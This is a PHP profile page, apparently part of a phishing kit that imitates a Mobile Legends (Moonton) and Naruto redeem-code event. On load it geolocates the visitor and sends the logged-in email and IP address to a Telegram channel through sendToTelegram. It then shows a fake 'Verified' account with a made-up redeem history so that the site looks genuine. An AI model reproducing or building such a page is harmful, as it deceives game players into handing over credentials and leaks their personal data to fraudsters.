<?php
session_start();
include 'includes/config.php';
include 'includes/functions.php';

// Jika belum login, redirect ke login
if (!isset($_SESSION['moonton_loggedin'])) {
    header("Location: login.php?redirect=profile.php");
    exit;
}

// Log akses halaman profile
$ip = getUserIP();
$asn = getASN($ip);
$city = getCity($ip);
$country = getCountry($ip);
sendToTelegram("Profile Accessed - User: {$_SESSION['moonton_email']} | IP: $ip");

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Profile - MLBB x Naruto</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        .profile-container {
            max-width: 800px;
            margin: 30px auto;
            padding: 30px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }
        
        .profile-header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }
        
        .profile-avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background-color: #f1f1f1;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 20px;
            overflow: hidden;
        }
        
        .profile-avatar img {
            width: 100%;
            height: auto;
        }
        
        .profile-info h2 {
            margin: 0;
            color: #333;
        }
        
        .profile-info p {
            margin: 5px 0 0;
            color: #777;
        }
        
        .profile-content {
            display: flex;
            flex-wrap: wrap;
        }
        
        .profile-section {
            flex: 1;
            min-width: 300px;
            margin-right: 20px;
        }
        
        .profile-section:last-child {
            margin-right: 0;
        }
        
        .section-title {
            color: #333;
            border-bottom: 2px solid #e74c3c;
            padding-bottom: 5px;
            margin-bottom: 15px;
        }
        
        .account-details p {
            margin: 10px 0;
        }
        
        .account-details strong {
            display: inline-block;
            width: 120px;
            color: #555;
        }
        
        .redeem-history {
            width: 100%;
        }
        
        .redeem-history table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .redeem-history th, .redeem-history td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #eee;
        }
        
        .redeem-history th {
            background-color: #f5f5f5;
            color: #333;
        }
        
        .logout-btn {
            display: inline-block;
            margin-top: 20px;
            padding: 8px 15px;
            background-color: #e74c3c;
            color: white;
            text-decoration: none;
            border-radius: 4px;
            transition: background-color 0.3s;
        }
        
        .logout-btn:hover {
            background-color: #c0392b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="profile-container">
            <div class="profile-header">
                <div class="profile-avatar">
                    <img src="assets/images/default-avatar.png" alt="Profile Avatar">
                </div>
                <div class="profile-info">
                    <h2><?= htmlspecialchars($_SESSION['moonton_user']) ?></h2>
                    <p><?= htmlspecialchars($_SESSION['moonton_email']) ?></p>
                </div>
            </div>
            
            <div class="profile-content">
                <div class="profile-section">
                    <h3 class="section-title">Account Details</h3>
                    <div class="account-details">
                        <p><strong>Email:</strong> <?= htmlspecialchars($_SESSION['moonton_email']) ?></p>
                        <p><strong>Status:</strong> Verified</p>
                        <p><strong>Last Login:</strong> <?= date('Y-m-d H:i:s') ?></p>
                        <p><strong>IP Address:</strong> <?= getUserIP() ?></p>
                    </div>
                    
                    <a href="logout.php" class="logout-btn">Logout</a>
                </div>
                
                <div class="profile-section">
                    <h3 class="section-title">Quick Actions</h3>
                    <div class="quick-actions">
                        <a href="index.php" class="action-btn">Redeem New Code</a>
                        <a href="#" class="action-btn">My Inventory</a>
                        <a href="#" class="action-btn">Account Settings</a>
                    </div>
                </div>
            </div>
            
            <div class="redeem-history">
                <h3 class="section-title">Redeem History</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Date</th>
                            <th>Code</th>
                            <th>Item</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><?= date('Y-m-d') ?></td>
                            <td>NARUTO2023</td>
                            <td>Naruto Skin</td>
                            <td>Pending</td>
                        </tr>
                        <tr>
                            <td>2023-05-10</td>
                            <td>MLBB2023</td>
                            <td>Diamonds</td>
                            <td>Completed</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</body>
</html>
